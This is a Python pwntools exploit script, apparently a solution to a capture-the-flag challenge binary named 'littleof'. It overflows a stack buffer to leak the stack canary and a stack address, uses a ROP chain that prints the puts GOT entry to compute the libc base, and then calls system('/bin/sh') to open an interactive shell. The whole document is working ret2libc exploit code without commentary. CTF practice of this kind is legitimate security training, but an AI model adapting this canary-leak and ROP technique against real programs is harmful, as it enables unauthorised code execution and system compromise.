#!/usr/bin/env python
from pwn import *

#context.log_level = 'debug'
context.terminal = ['tmux', 'split', '-h']

local = 1
if local:
    p = process('./littleof')
    elf = ELF('./littleof')
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
else:
    pass

#gdb.attach(p, 'b *0x400750\nc')

# leak canary
p.recvuntil('Do you know how to do buffer overflow?\n')
p.send('A' * 0x48 + 'B')
p.recvuntil('A' * 0x48 + 'B')
canary = u64(p.recv(7).rjust(8, '\x00'))
info('canary = ' + hex(canary))
stack = u64(p.recv(6).ljust(8, '\x00'))
info('stack = ' + hex(stack))

# rop
puts_got = elf.got['puts']
puts_plt = elf.plt['puts']
pop_rdi_ret = 0x0000000000400863
again = 0x0000000000400750
ret = 0x000000000040059e
# 1. leak libc
p.recvuntil('Try harder!')
p.send('A' * 0x48 + p64(canary) + p64(stack + 0xa0) + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(again))
p.recvuntil('I hope you win\n')
libc_base = u64(p.recv(6).ljust(8, '\x00')) - libc.symbols['puts']
info('libc_base = ' + hex(libc_base))
# 2. get shell
bin_sh_addr = libc_base + next(libc.search('/bin/sh\x00'))
system = libc_base + libc.symbols['system']
p.send('B' * 0x48 + p64(canary) + p64(0xdeadbeef) + p64(pop_rdi_ret) + p64(bin_sh_addr) + p64(ret) + p64(system))

p.interactive()

